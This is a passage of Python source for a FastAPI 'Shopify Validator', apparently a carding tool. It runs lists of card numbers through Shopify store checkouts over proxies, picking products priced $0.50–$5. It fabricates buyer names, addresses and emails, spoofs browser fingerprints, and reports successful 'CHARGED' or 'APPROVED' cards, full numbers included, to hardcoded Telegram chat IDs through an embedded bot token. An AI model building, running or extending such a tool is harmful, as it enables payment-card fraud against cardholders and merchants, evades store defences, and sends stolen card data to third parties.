"""
Endpoints:
  GET /shopify?site={site}&cc={card}&proxy={proxy}
  GET /check?site={site}&card={card}&proxy={proxy}
  GET /health

Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...

Environment variables (all optional):
  PORT              Server port (default 8080)
  WORKERS           uvicorn worker count (default 4)
  CARDS_FILE        Path to cards.txt (default ./cards.txt)
  MAX_PRICE         Max product price to target (default 8.0)
  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
  POOL_SIZE         aiohttp global connection pool (default 500)
  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
  CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
  CACHE_TTL         Product cache TTL seconds (default 300)
  LOG_LEVEL         Logging level: debug|info|warning (default warning)
"""

import asyncio
import sys
import copy

import logging
import os
import random
import re
import time
from collections import defaultdict
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession, RequestsError
import orjson
import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

# ---------------------------------------------------------------------------
# Configuration from environment  (Railway Pro defaults — 5 replicas)
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 8))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))   # 0.50 - 5.00 ডলার সীমা
MIN_PRICE        = float(os.environ.get("MIN_PRICE", 0.50))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 100))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 3000))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 150))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 30))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 600))
ERROR_CACHE_TTL  = float(os.environ.get("ERROR_CACHE_TTL", 30))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

# ---------------------------------------------------------------------------
# Admin Hit Notifications
# ---------------------------------------------------------------------------
ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
ADMIN_HIT_RECEIVER_ID  = 8524951580

async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
    """Fire-and-forget Telegram notification for Charged/Approved hits."""
    try:
        from datetime import datetime as _dt
        import urllib.request, urllib.parse, json as _json

        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = "\U0001f48e CHARGED"
        elif "APPROVED" in status.upper():
            status_text = "\u2705 APPROVED"
        else:
            status_text = f"\U0001f4cc {status}"

        time_str = _dt.now().strftime("%H:%M:%S")

        message = (
            f"<b>{status_text} \u2022 API HIT</b>\n\n"
            f"\U0001f6d2 <b>Site:</b> {site}\n"
            f"\u23f0 <b>Time:</b> {time_str}\n\n"
            f"\U0001f4b3 <b>CC:</b> <code>{card}</code>\n\n"
            f"\U0001f6d2 <b>Gateway:</b> {gateway}\n"
            f"\U0001f4dd <b>Response:</b> {response[:150]}\n"
            f"\U0001f4b8 <b>Price:</b> {price}"
        )

        receivers = [ADMIN_HIT_RECEIVER_ID, 8428369446]
        url = f"https://api.telegram.org/bot{ADMIN_HIT_SENDER_TOKEN}/sendMessage"
        
        loop = asyncio.get_running_loop()
        for receiver in receivers:
            payload = _json.dumps({
                "chat_id": receiver,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }).encode("utf-8")
            req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
            await loop.run_in_executor(None, urllib.request.urlopen, req)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# GraphQL Queries
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

POSTAL_HUBS: dict[str, list[tuple[str, str, str, list[str]]]] = {
    "US": [
        ("New York", "NY", "10001", ["212", "646", "917"]), ("Brooklyn", "NY", "11201", ["718", "347"]),
        ("Los Angeles", "CA", "90001", ["213", "310", "323"]), ("San Francisco", "CA", "94102", ["415", "628"]),
        ("San Diego", "CA", "92101", ["619", "858"]), ("Chicago", "IL", "60601", ["312", "773", "872"]),
        ("Houston", "TX", "77002", ["713", "281", "832"]), ("Austin", "TX", "78701", ["512", "737"]),
        ("Dallas", "TX", "75201", ["214", "469"]), ("Miami", "FL", "33101", ["305", "786"]),
        ("Orlando", "FL", "32801", ["407", "689"]), ("Seattle", "WA", "98101", ["206"]),
        ("Denver", "CO", "80202", ["303", "720"]), ("Boston", "MA", "02108", ["617", "857"]),
        ("Phoenix", "AZ", "85001", ["602", "480"]), ("Philadelphia", "PA", "19102", ["215", "267"]),
        ("Atlanta", "GA", "30303", ["404", "678"]), ("Las Vegas", "NV", "89101", ["702"]),
        ("Portland", "OR", "97201", ["503", "971"]), ("Detroit", "MI", "48226", ["313"]),
        ("Minneapolis", "MN", "55401", ["612"]), ("St. Louis", "MO", "63101", ["314"]),
        ("Charlotte", "NC", "28202", ["704", "980"]), ("Nashville", "TN", "37201", ["615"]),
        ("Salt Lake City", "UT", "84101", ["801"]), ("Columbus", "OH", "43215", ["614"]),
        ("Indianapolis", "IN", "46204", ["317"]), ("Baltimore", "MD", "21201", ["410", "443"]),
        ("Milwaukee", "WI", "53202", ["414"]), ("Honolulu", "HI", "96813", ["808"]),
    ],
    "CA": [
        ("Toronto", "ON", "M5V 3L9", ["416", "647", "437"]), ("Vancouver", "BC", "V6Z 2K5", ["604", "778"]),
        ("Montreal", "QC", "H3B 4L4", ["514", "438"]), ("Calgary", "AB", "T2P 1G8", ["403", "587"]),
        ("Ottawa", "ON", "K1P 5J2", ["613"]), ("Edmonton", "AB", "T5J 0N3", ["780"]),
        ("Winnipeg", "MB", "R3C 1A5", ["204"]), ("Quebec City", "QC", "G1R 2J7", ["418"]),
        ("Halifax", "NS", "B3J 2B6", ["902"]), ("Victoria", "BC", "V8W 1P6", ["250"]),
    ],
    "GB": [
        ("London", "ENG", "SW1A 1AA", ["207", "208"]), ("Manchester", "ENG", "M3 2GQ", ["161"]),
        ("Edinburgh", "SCT", "EH2 2LE", ["131"]), ("Birmingham", "ENG", "B2 4PF", ["121"]),
        ("Leeds", "ENG", "LS1 2ES", ["113"]), ("Glasgow", "SCT", "G2 1DY", ["141"]),
        ("Bristol", "ENG", "BS1 4DJ", ["117"]), ("Liverpool", "ENG", "L1 8JQ", ["151"]),
        ("Cardiff", "WLS", "CF10 1EP", ["29"]), ("Belfast", "NIR", "BT1 5GS", ["28"]),
    ],
    "AU": [
        ("Sydney", "NSW", "2000", ["02"]), ("Melbourne", "VIC", "3000", ["03"]),
        ("Brisbane", "QLD", "4000", ["07"]), ("Perth", "WA", "6000", ["08"]),
        ("Adelaide", "SA", "5000", ["08"]), ("Canberra", "ACT", "2601", ["02"]),
    ],
    "DE": [
        ("Berlin", "BE", "10117", ["030"]), ("Munich", "BY", "80331", ["089"]),
        ("Frankfurt", "HE", "60313", ["069"]), ("Hamburg", "HH", "20095", ["040"]),
        ("Cologne", "NW", "50667", ["0221"]), ("Stuttgart", "BW", "70173", ["0711"]),
    ],
    "FR": [
        ("Paris", "IDF", "75008", ["01"]), ("Lyon", "ARA", "69001", ["04"]),
        ("Marseille", "PAC", "13001", ["04"]), ("Bordeaux", "NAQ", "33000", ["05"]),
        ("Nice", "PAC", "06000", ["04"]), ("Toulouse", "OCC", "31000", ["05"]),
    ],
    "IT": [
        ("Rome", "RM", "00186", ["06"]), ("Milan", "MI", "20121", ["02"]),
        ("Naples", "NA", "80132", ["081"]), ("Turin", "TO", "10121", ["011"]),
        ("Florence", "FI", "50123", ["055"]), ("Bologna", "BO", "40121", ["051"]),
    ],
    "ES": [
        ("Madrid", "MD", "28013", ["91"]), ("Barcelona", "CT", "08007", ["93"]),
        ("Valencia", "VC", "46002", ["96"]), ("Seville", "AN", "41001", ["95"]),
    ],
    "NL": [
        ("Amsterdam", "NH", "1012 LM", ["020"]), ("Rotterdam", "ZH", "3011 AL", ["010"]),
        ("The Hague", "ZH", "2511 CR", ["070"]), ("Utrecht", "UT", "3511 AX", ["030"]),
    ],
    "SE": [("Stockholm", "AB", "111 51", ["08"]), ("Gothenburg", "O", "411 06", ["031"])],
    "NO": [("Oslo", "03", "0154", ["22"]), ("Bergen", "46", "5003", ["55"])],
    "DK": [("Copenhagen", "84", "1165", ["33"]), ("Aarhus", "82", "8000", ["86"])],
    "CH": [("Zurich", "ZH", "8001", ["044"]), ("Geneva", "GE", "1201", ["022"])],
    "NZ": [("Auckland", "AUK", "1010", ["09"]), ("Wellington", "WGN", "6011", ["04"])],
    "IE": [("Dublin", "D", "D02 X285", ["01"]), ("Cork", "CO", "T12 K8N3", ["021"])],
    "SG": [("Singapore", "01", "048616", ["65"]), ("Singapore", "02", "238801", ["65"])],
    "HK": [("Central", "HK", "000000", ["852"]), ("Kowloon", "KLN", "000000", ["852"])],
    "JP": [("Tokyo", "13", "100-0005", ["03"]), ("Osaka", "27", "530-0001", ["06"])],
    "BR": [("Sao Paulo", "SP", "01310-100", ["11"]), ("Rio de Janeiro", "RJ", "20040-002", ["21"])],
    "MX": [("Mexico City", "CMX", "06600", ["55"]), ("Guadalajara", "JAL", "44100", ["33"])],
    "IN": [("Mumbai", "MH", "400001", ["022"]), ("New Delhi", "DL", "110001", ["011"]), ("Bangalore", "KA", "560001", ["080"])],
    "AE": [("Dubai", "DU", "00000", ["04"]), ("Abu Dhabi", "AZ", "00000", ["02"])],
    "ZA": [("Johannesburg", "GT", "2001", ["011"]), ("Cape Town", "WC", "8001", ["021"])],
    "KR": [("Seoul", "11", "04524", ["02"]), ("Busan", "26", "48058", ["051"])],
    "DEFAULT": [
        ("New York", "NY", "10007", ["212", "646"]), ("San Francisco", "CA", "94108", ["415", "628"]),
        ("Chicago", "IL", "60601", ["312"]), ("London", "ENG", "SW1A 1AA", ["207"]),
    ]
}

STREET_POOLS: dict[str, list[str]] = {
    "EN": [
        "Main St", "Oak Ave", "Maple Blvd", "Park Ave", "Washington St", "Elm St", "Cedar Rd",
        "Lakeview Dr", "Sunset Blvd", "Broadway", "Pine St", "Chestnut St", "Walnut St",
        "Market St", "Mission St", "Boylston St", "Beacon St", "Peachtree St", "Michigan Ave",
        "Fulton St", "Lexington Ave", "Madison Ave", "Fifth Ave", "Congress Ave", "Wynkoop St",
        "High St", "Church St", "Spring St", "Union St", "Court St", "River Rd", "Hillside Ave",
        "Queen St", "King St", "Victoria St", "George St", "Albert St", "William St", "Elizabeth St",
        "Baker St", "Oxford St", "Regent St", "Strand", "Piccadilly", "Fleet St", "Deansgate",
    ],
    "DE": [
        "Hauptstrasse", "Bahnhofstrasse", "Schillerstrasse", "Goethestrasse", "Gartenstrasse",
        "Berliner Strasse", "Lindenstrasse", "Mozartstrasse", "Friedrichstrasse", "Königstrasse",
    ],
    "FR": [
        "Rue de la Paix", "Avenue Victor Hugo", "Rue Nationale", "Boulevard Haussmann",
        "Rue Gambetta", "Avenue Jean Jaurès", "Rue de Rivoli", "Avenue des Champs-Élysées",
    ],
    "ES": [
        "Gran Vía", "Calle Mayor", "Avenida de la Constitución", "Calle Real", "Paseo de la Reforma",
        "Avenida Insurgentes", "Calle Hidalgo", "Calle Juárez", "Avenida Balmes", "Passeig de Gràcia",
    ],
    "IT": [
        "Via Roma", "Via Garibaldi", "Via Mazzini", "Via Dante", "Corso Vittorio Emanuele",
        "Via XX Settembre", "Via Verdi", "Corso Buenos Aires", "Via Cavour", "Corso Umberto I",
    ],
}

FIRST_NAMES = [
    "James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
    "Christopher","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua",
    "Kenneth","Kevin","Brian","George","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan",
    "Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon",
    "Benjamin","Samuel","Gregory","Alexander","Frank","Patrick","Raymond","Jack","Dennis","Jerry",
    "Tyler","Aaron","Jose","Adam","Nathan","Henry","Douglas","Zachary","Peter","Kyle",
    "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen",
    "Emily","Nancy","Lisa","Margaret","Betty","Sandra","Ashley","Dorothy","Kimberly","Donna",
    "Carol","Michelle","Emily","Helen","Amanda","Melissa","Deborah","Stephanie","Rebecca","Laura",
    "Sharon","Cynthia","Kathleen","Amy","Shirley","Angela","Anna","Brenda","Pamela","Nicole",
    "Samantha","Katherine","Emma","Ruth","Christine","Catherine","Debra","Rachel","Carolyn","Janet",
    "Virginia","Maria","Heather","Diane","Julie","Joyce","Victoria","Kelly","Christina","Lauren"
]
LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
    "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
    "Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson",
    "Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
    "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts",
    "Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes",
    "Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper",
    "Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson",
    "Watson","Brooks","Chavez","Wood","James","Bennett","Gray","Mendoza","Ruiz","Hughes",
    "Price","Alvarez","Castillo","Sanders","Patel","Myers","Long","Ross","Foster","Jimenez"
]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com","gmx.com","zoho.com","yandex.com"]

BROWSER_PROFILES = [
    {
        "impersonate": "chrome124",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "chrome124",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"macOS"',
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "chrome120",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "chrome119",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "chrome116",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.8",
    },
    {
        "impersonate": "safari17_0",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_mobile": None,
        "sec_ch_ua_platform": None,
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "safari15_5",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_mobile": None,
        "sec_ch_ua_platform": None,
        "accept_language": "en-GB,en;q=0.9",
    },
    {
        "impersonate": "edge101",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
        "sec_ch_ua": '" Microsoft Edge";v="101", "Chromium";v="101", "Not=A?Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
]

# ---------------------------------------------------------------------------
# Global process-level state
# ---------------------------------------------------------------------------
_shared_session: Optional[AsyncSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)

_product_cache: dict[str, dict] = {}

_cards_cache: list[dict] = []
_cards_loaded_at: float  = 0.0


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT)
    _reload_cards()
    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site", POOL_SIZE, SITE_CONCURRENCY)
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="3.1.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache  = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if os.path.exists(CARDS_FILE):
        with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                card = _parse_card(line.strip())
                if card:
                    cards.append(card)
    if not cards:
        cards = [
            {"cc": "4031630422575208", "month": "01", "year": "30", "cvv": "280"},
            {"cc": "4242424242424242", "month": "12", "year": "28", "cvv": "123"},
        ]
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if "://" in s:
        return s
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld    = netloc.split(".")[-1].upper()
    country = tld
    if country not in POSTAL_HUBS:
        if currency:
            country = C2C.get(currency.upper(), "US")
        else:
            country = "US"
    if country not in POSTAL_HUBS:
        country = "US"

    hubs = POSTAL_HUBS[country]
    city, zone, postal, areas = random.choice(hubs)

    street_name = None
    try:
        from faker import Faker
        locale_map = {
            "US": "en_US", "CA": "en_CA", "GB": "en_GB", "AU": "en_AU",
            "DE": "de_DE", "FR": "fr_FR", "IT": "it_IT", "ES": "es_ES",
            "NL": "nl_NL", "BR": "pt_BR", "MX": "es_MX", "JP": "ja_JP", "IN": "en_IN"
        }
        loc = locale_map.get(country)
        if loc:
            f = Faker(loc)
            street_name = f.street_name()
    except Exception:
        pass

    if not street_name:
        lang = "EN"
        if country in ("DE", "CH", "AT"): lang = "DE"
        elif country in ("FR", "BE"): lang = "FR"
        elif country in ("ES", "MX"): lang = "ES"
        elif country in ("IT",): lang = "IT"
        pool = STREET_POOLS.get(lang) or STREET_POOLS["EN"]
        street_name = random.choice(pool)

    house_num = random.randint(14, 9850)
    address1 = f"{house_num} {street_name}"

    if random.random() < 0.6:
        unit_type = random.choice(["Apt", "Suite", "Unit", "#", "Rm"])
        unit_num = random.randint(1, 650)
        address1 = f"{address1}, {unit_type} {unit_num}"

    area = random.choice(areas) if areas else "212"
    phone = f"{area}{random.randint(2000000, 9999999)}"

    return {
        "address1":    address1,
        "city":        city,
        "postalCode":  postal,
        "zoneCode":    zone,
        "countryCode": country,
        "phone":       phone,
    }


def _random_identity() -> tuple[str, str, str]:
    first, last = None, None
    try:
        from faker import Faker
        f = Faker()
        first = f.first_name()
        last  = f.last_name()
    except Exception:
        pass
    if not first or not last:
        first = random.choice(FIRST_NAMES)
        last  = random.choice(LAST_NAMES)

    year  = random.randint(1978, 2003)
    domain = random.choice(EMAIL_DOMAINS)
    email = random.choice([
        f"{first.lower()}.{last.lower()}{random.randint(1,99)}@{domain}",
        f"{first.lower()}_{last.lower()}_{year}@{domain}",
        f"{first.lower()}{last.lower()}{year}@{domain}",
        f"{first.lower()[0]}{last.lower()}{random.randint(100,999)}@{domain}",
    ])
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    """Fast substring extraction between two delimiters."""
    idx = text.find(start)
    if idx == -1:
        return None
    sub     = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
